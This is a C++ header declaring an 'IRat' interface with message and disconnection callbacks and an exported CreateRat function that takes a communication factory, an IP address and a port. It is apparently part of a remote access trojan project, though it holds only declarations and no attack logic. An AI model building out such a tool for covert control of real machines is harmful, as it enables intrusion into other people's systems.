#pragma once

#include "ICommunicationFactory.h"

class IRat
{
public:
	virtual ~IRat() = default;
	virtual void OnMessage(MessageType type, SharedSpan content) = 0;
	virtual void OnDisconnection() = 0;
};

__declspec(dllexport)
std::shared_ptr<IRat> CreateRat(
	std::shared_ptr<ICommunicationFactory> factory,
	const char* ip,
	int port);